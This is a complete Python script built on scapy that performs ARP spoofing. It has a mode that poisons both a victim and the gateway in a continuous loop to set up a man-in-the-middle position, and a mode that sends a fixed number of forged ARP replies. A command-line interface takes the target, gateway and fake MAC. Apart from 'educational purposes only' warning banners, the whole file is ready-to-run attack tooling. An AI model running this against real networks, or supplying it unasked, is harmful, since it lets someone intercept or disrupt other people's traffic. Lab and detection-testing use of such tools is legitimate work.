#!/usr/bin/env python3
"""
ARP Spoofing Attack Simulator
Demonstrates ARP poisoning attack for educational purposes
"""

import os
import sys
import time
import logging
from scapy.all import ARP, send, get_if_hwaddr
import argparse

# Setup logging
logging.basicConfig(
    level=logging.INFO,
    format='[ARP-Spoofer] %(asctime)s - %(levelname)s - %(message)s'
)
logger = logging.getLogger(__name__)

class ARPSpoofer:
    """Performs ARP spoofing attacks"""

    def __init__(self, interface="eth1"):
        self.interface = interface
        self.attack_active = False

    def spoof(self, target_ip, spoof_ip, fake_mac=None):
        """
        Send a spoofed ARP reply claiming that spoof_ip has fake_mac

        Args:
            target_ip: IP address of the victim
            spoof_ip: IP address we're claiming to be
            fake_mac: MAC address to claim (if None, use our own)
        """
        try:
            if fake_mac is None:
                fake_mac = get_if_hwaddr(self.interface)

            # Create spoofed ARP reply
            arp_response = ARP(
                op=2,  # ARP reply
                pdst=target_ip,  # Victim's IP
                hwdst="ff:ff:ff:ff:ff:ff",  # Broadcast
                psrc=spoof_ip,  # IP we're claiming to be
                hwsrc=fake_mac  # Our fake MAC
            )

            # Send the packet
            send(arp_response, iface=self.interface, verbose=False)
            logger.warning(f"🔴 Spoofed ARP: Told {target_ip} that {spoof_ip} is at {fake_mac}")
            return True

        except Exception as e:
            logger.error(f"Failed to send spoof packet: {e}")
            return False

    def mitm_attack(self, target_ip, gateway_ip, fake_mac="11:22:33:44:55:66", interval=2):
        """
        Perform a Man-in-the-Middle attack by poisoning both target and gateway

        Args:
            target_ip: Victim's IP address
            gateway_ip: Gateway/router IP address
            fake_mac: Attacker's MAC address
            interval: Seconds between spoofed packets
        """
        logger.warning("="*60)
        logger.warning("🔴 STARTING ARP SPOOFING ATTACK")
        logger.warning("="*60)
        logger.warning(f"Target IP: {target_ip}")
        logger.warning(f"Gateway IP: {gateway_ip}")
        logger.warning(f"Fake MAC: {fake_mac}")
        logger.warning(f"Interface: {self.interface}")
        logger.warning(f"Interval: {interval} seconds")
        logger.warning("="*60)
        logger.warning("")
        logger.warning("⚠️  This is for EDUCATIONAL PURPOSES ONLY!")
        logger.warning("⚠️  Only use in authorized test environments!")
        logger.warning("")

        self.attack_active = True
        packet_count = 0

        try:
            while self.attack_active:
                # Spoof to target: claim we are the gateway
                self.spoof(target_ip, gateway_ip, fake_mac)
                packet_count += 1

                # Spoof to gateway: claim we are the target
                self.spoof(gateway_ip, target_ip, fake_mac)
                packet_count += 1

                logger.info(f"Packets sent: {packet_count}")
                time.sleep(interval)

        except KeyboardInterrupt:
            logger.info("\n\n⏹️  Attack stopped by user")
            logger.info(f"Total spoofed packets sent: {packet_count}")
            self.attack_active = False

    def simple_spoof_attack(self, victim_ip, target_ip, fake_mac="11:22:33:44:55:66", count=10, interval=2):
        """
        Simple spoofing attack: tell victim that target_ip has a fake MAC

        Args:
            victim_ip: IP of the host to mislead
            target_ip: IP we're claiming to be
            fake_mac: Fake MAC to advertise
            count: Number of packets to send
            interval: Seconds between packets
        """
        logger.warning("="*60)
        logger.warning("🔴 SIMPLE ARP SPOOFING ATTACK")
        logger.warning("="*60)
        logger.warning(f"Victim: {victim_ip}")
        logger.warning(f"Impersonating: {target_ip}")
        logger.warning(f"Fake MAC: {fake_mac}")
        logger.warning(f"Packets: {count}")
        logger.warning(f"Interval: {interval} seconds")
        logger.warning("="*60)
        logger.warning("")

        for i in range(count):
            success = self.spoof(victim_ip, target_ip, fake_mac)
            if success:
                logger.info(f"✅ Packet {i+1}/{count} sent")
            else:
                logger.error(f"❌ Packet {i+1}/{count} failed")

            if i < count - 1:  # Don't sleep after last packet
                time.sleep(interval)

        logger.info(f"\n🎯 Attack complete! Sent {count} spoofed packets")

def main():
    parser = argparse.ArgumentParser(
        description="ARP Spoofing Attack Simulator (Educational Only)",
        epilog="⚠️  WARNING: Only use in authorized test environments!"
    )

    parser.add_argument("-i", "--interface", default="eth1", help="Network interface (default: eth1)")
    parser.add_argument("-t", "--target", required=True, help="Target/victim IP address")
    parser.add_argument("-g", "--gateway", help="Gateway IP (for MITM attack)")
    parser.add_argument("-s", "--spoof", help="IP address to impersonate")
    parser.add_argument("-m", "--mac", default="11:22:33:44:55:66", help="Fake MAC address")
    parser.add_argument("-c", "--count", type=int, default=10, help="Number of packets (simple mode)")
    parser.add_argument("-n", "--interval", type=int, default=2, help="Interval between packets (seconds)")
    parser.add_argument("--mitm", action="store_true", help="Perform MITM attack (requires --gateway)")

    args = parser.parse_args()

    spoofer = ARPSpoofer(interface=args.interface)

    if args.mitm:
        if not args.gateway:
            logger.error("❌ MITM attack requires --gateway argument")
            sys.exit(1)
        spoofer.mitm_attack(args.target, args.gateway, args.mac, args.interval)
    else:
        if not args.spoof:
            logger.error("❌ Simple attack requires --spoof argument")
            sys.exit(1)
        spoofer.simple_spoof_attack(args.target, args.spoof, args.mac, args.count, args.interval)

if __name__ == "__main__":
    main()
